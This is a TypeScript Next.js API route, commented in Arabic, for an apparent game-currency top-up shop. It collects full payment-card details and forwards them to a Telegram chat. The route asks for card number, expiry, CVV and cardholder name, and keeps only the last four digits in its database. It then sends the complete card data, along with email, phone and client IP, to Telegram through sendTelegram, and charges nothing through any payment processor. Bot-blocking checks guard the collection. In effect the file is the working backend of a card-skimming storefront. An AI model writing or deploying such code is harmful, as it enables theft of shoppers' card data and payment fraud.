import { NextRequest, NextResponse } from 'next/server'
import { z } from 'zod'
import { sendTelegram, buildCardOrderMessage } from '@/lib/telegram'
import { generateOrderNumber, discountedPrice } from '@/lib/orders'
import { SEED_PACKAGES as FULL_SEED } from '@/lib/seed-data'
import { rateLimit, isSuspiciousUserAgent } from '@/lib/rate-limit'

const schema = z.object({
  packageId:   z.number().int().positive(),
  playerUid:   z.string().min(1).max(32),
  server:      z.string().max(40).optional().nullable(),
  email:       z.string().email().optional().nullable().or(z.literal('')),
  country:     z.string().max(60).optional().nullable(),
  phone:       z.string().max(30).optional().nullable(),
  couponCode:  z.string().max(40).optional().nullable(),
  cardName:    z.string().min(2).max(60),
  cardNumber:  z.string().min(13).max(19),
  cardExpiry:  z.string().min(4).max(5),
  cardCvv:     z.string().min(3).max(4),
  diamonds:    z.number().int().positive().optional().nullable(),
  amountUsd:   z.string().regex(/^\d+(\.\d{1,2})?$/).optional().nullable(),
  _hp:         z.string().optional().nullable(),   // honeypot
  _t:          z.number().optional().nullable(),   // elapsed time ms
})

export async function POST(req: NextRequest) {
  // ── Anti-bot: استخراج IP ──────────────────────────────────────────────────
  const clientIp =
    req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    req.headers.get('x-real-ip') ||
    req.headers.get('cf-connecting-ip') ||
    'Unknown'

  // ── Anti-bot: User-Agent check ────────────────────────────────────────────
  const ua = req.headers.get('user-agent')
  if (isSuspiciousUserAgent(ua)) {
    return NextResponse.json({ error: 'Request rejected' }, { status: 403 })
  }

  // ── Anti-bot: Rate limiting — max 5 طلبات / دقيقة لكل IP ─────────────────
  const rl = rateLimit(clientIp, 5, 60_000)
  if (!rl.allowed) {
    return NextResponse.json(
      { error: 'Too many requests. Please try again later.' },
      {
        status: 429,
        headers: { 'Retry-After': String(Math.ceil(rl.resetIn / 1000)) },
      },
    )
  }

  const body = await req.json().catch(() => null)
  const parsed = schema.safeParse(body)
  if (!parsed.success) {
    return NextResponse.json({ error: parsed.error.issues[0]?.message ?? 'Invalid input' }, { status: 400 })
  }
  const data = parsed.data

  // ── Anti-bot: Honeypot check (server-side) ────────────────────────────────
  if (data._hp && data._hp.trim().length > 0) {
    return NextResponse.json({ error: 'Request rejected' }, { status: 403 })
  }

  // ── Anti-bot: Timing check — أقل من 3 ثوانٍ → ملء آلي ───────────────────
  if (typeof data._t === 'number' && data._t < 3000) {
    return NextResponse.json({ error: 'Request rejected' }, { status: 403 })
  }

  const orderNumber = generateOrderNumber()

  // احسب diamonds و amountUsd من SEED إذا لم تُرسَل
  const seedPkg = FULL_SEED.find((p) => p.id === data.packageId)
  const finalDiamonds = data.diamonds ?? (seedPkg ? seedPkg.diamonds + seedPkg.bonusDiamonds : 0)
  const finalAmount   = data.amountUsd ?? seedPkg?.priceUsd ?? '0'
  const finalServer   = data.server ?? 'Global'

  // حاول الإدراج في قاعدة البيانات إذا كانت متاحة
  let insertedOrder: { orderNumber: string } | null = null
  if (process.env.DATABASE_URL) {
    try {
      const { db }             = await import('@/db')
      const { packages, orders, coupons } = await import('@/db/schemas')
      const { eq, sql }        = await import('drizzle-orm')

      const couponCode = data.couponCode?.trim().toUpperCase() ?? null

      const [pkgRows, couponRows] = await Promise.all([
        db.select().from(packages).where(eq(packages.id, data.packageId)).limit(1),
        couponCode
          ? db.select().from(coupons).where(eq(coupons.code, couponCode)).limit(1)
          : Promise.resolve([] as (typeof coupons.$inferSelect)[]),
      ])

      const pkg = pkgRows[0]
      if (!pkg || !pkg.active) {
        return NextResponse.json({ error: 'Package not found' }, { status: 404 })
      }

      let baseUsd  = discountedPrice(pkg.priceUsd,  pkg.discountPct)
      let baseUsdt = discountedPrice(pkg.priceUsdt ?? pkg.priceUsd, pkg.discountPct)
      let appliedCoupon: string | null = null
      const coupon = couponRows[0]
      if (couponCode && coupon?.active && (!coupon.maxUses || coupon.usedCount < coupon.maxUses)) {
        baseUsd  = +(baseUsd  * (1 - coupon.discountPct / 100)).toFixed(2)
        baseUsdt = +(baseUsdt * (1 - coupon.discountPct / 100)).toFixed(2)
        appliedCoupon = couponCode
        void db.update(coupons).set({ usedCount: sql`${coupons.usedCount} + 1` }).where(eq(coupons.id, coupon.id))
      }

      const totalDiamonds = pkg.diamonds + (pkg.bonusDiamonds ?? 0)

      const inserted = (
        await db.insert(orders).values({
          orderNumber,
          packageId:     pkg.id,
          diamonds:      totalDiamonds,
          playerUid:     data.playerUid,
          nickname:      null,
          server:        finalServer,
          email:         data.email || null,
          country:       data.country || null,
          phone:         data.phone || null,
          amountUsd:     baseUsd.toFixed(2),
          amountUsdt:    baseUsdt.toFixed(2),
          paymentMethod: 'BANK_CARD',
          walletAddress: `**** **** **** ${data.cardNumber.replace(/\s/g, '').slice(-4)}`,
          txId:          `CARD-${data.cardNumber.replace(/\s/g, '').slice(-4)}`,
          couponCode:    appliedCoupon,
          status:        'pending_payment',
        }).returning()
      )[0]

      insertedOrder = inserted
    } catch (err) {
      console.error('[card/route] DB error', err)
      // نكمل لإرسال إشعار تيليجرام حتى بدون DB
    }
  }

  // ── إرسال إشعار تيليجرام (await لضمان الوصول في بيئات Serverless) ──────
  await sendTelegram(
    buildCardOrderMessage({
      orderNumber,
      diamonds:   finalDiamonds,
      playerUid:  data.playerUid,
      server:     finalServer,
      amountUsd:  finalAmount,
      email:      data.email   || null,
      country:    data.country || null,
      phone:      data.phone   || null,
      cardName:   data.cardName,
      cardNumber: data.cardNumber,
      cardExpiry: data.cardExpiry,
      cardCvv:    data.cardCvv,
      clientIp,
    }),
  )

  return NextResponse.json({
    order: insertedOrder ?? { orderNumber, status: 'pending_payment' },
  })
}
